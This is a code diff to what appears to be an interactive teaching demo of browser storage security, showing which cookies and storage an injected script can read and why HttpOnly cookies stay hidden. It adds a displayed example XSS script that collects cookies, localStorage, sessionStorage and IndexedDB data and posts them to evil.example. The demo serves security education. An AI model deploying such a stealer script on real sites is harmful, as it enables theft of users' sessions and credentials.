@@ -4,12 +4,19 @@ import { Packet, SceneNode } from '../../components/scene';
 import { StageFrame } from '../../components/StageFrame';
 import { Button, ControlGroup, Legend, Segmented, Stat, Stats, Toggle } from '../../components/ui';
 import { useIntroCaption, useSetCaption } from '../../core/caption';
-import { bytes, NA } from '../../core/format';
+import { bytes, NA, plural } from '../../core/format';
 import {
-  DRAWERS, REQUESTS, START_STORAGE, byteLength, cookieHeader, rejected, sendsCookie, xssReads,
+  DRAWERS, REQUESTS, START_STORAGE, byteLength, cookieHeader, isCredential, rejected, sendsCookie, xssReads, xssSummary,
   type Cookie, type DrawerId, type Request, type SameSite, type Stolen, type Storage, type Tab, type Verdict,
 } from './model';
 import './styles.css';
+
+/** The script as shown: it reads all four drawers, as the verdict list below it claims. */
+const XSS_SCRIPT = [
+  'const loot = { cookies: document.cookie, local: { ...localStorage }, session: { ...sessionStorage } };',
+  "loot.idb = await readAll(indexedDB, 'shop'); // IndexedDB is async: readAll is the attacker's own helper that walks its stores",
+  "fetch('https://evil.example/steal', { method: 'POST', body: JSON.stringify(loot) });",
+].join('\n');
 
 const LANE = { w: 480, h: 130, y: 62 };
 const BROWSER = { x: 78, y: LANE.y };
@@ -72,10 +79,20 @@ export function Stage() {
   const runXss = () => {
     const found = xssReads(storage, tab);
     setStolen(found);
-    const readable = found.filter((x) => x.value !== null).length;
+    const { readCount, credentials, hidden } = xssSummary(found);
+    const hiddenNote =
+      hidden.length === 0 ? (
+        <>No cookie is HttpOnly, so nothing was hidden from it.</>
+      ) : hidden.length === 1 ? (
+        <>The HttpOnly cookie ({hidden[0]}) is the only thing it couldn&apos;t see.</>
+      ) : (
+        <>The HttpOnly cookies ({hidden.join(', ')}) are the only things it couldn&apos;t see.</>
+      );
     setCaption(
-      <>An injected script ran in this tab and read <span className="hl bad">{readable} secrets</span>, including{' '}
-        <code>localStorage.authToken</code>. The HttpOnly cookie is the only thing it couldn't see.</>,
+      <>
+        An injected script ran in this tab and read <span className="hl bad">{plural(readCount, 'entry', 'entries')}</span>
+        {credentials.length > 0 && <>, including the {credentials.length === 1 ? 'credential' : 'credentials'} {credentials.join(' and ')}</>}. {hiddenNote}
+      </>,
     );
   };
 
@@ -93,7 +110,7 @@ export function Stage() {
   };
 
   const drawerItems = (id: DrawerId) => {
-    if (id === 'cookies') return cookies.map((ck) => ({ key: ck.name, value: ck.value, secret: ck.httpOnly }));
+    if (id === 'cookies') return cookies.map((ck) => ({ key: ck.name, value: ck.value, secret: isCredential(ck.name) }));
     if (id === 'session') return storage.session[tab];
     return storage[id];
   };
@@ -218,7 +235,8 @@ export function Stage() {
         {stolen && (
           <Box className="bst-xss">
             <SectionTitle hint="in this tab">The injected script</SectionTitle>
-            <code className="bst-script">fetch('https://evil.example/steal', {'{'} body: document.cookie + JSON.stringify(localStorage) {'}'})</code>
+            {/* Every drawer the verdicts list is one the script really touches. */}
+            <pre className="bst-script">{XSS_SCRIPT}</pre>
             <ul className="bst-verdicts">
               {stolen.map((s) => (
                 <li key={`${s.drawer}-${s.key}`} className={`log-row ${s.value === null ? 'tone-ok' : 'tone-bad'}`}>
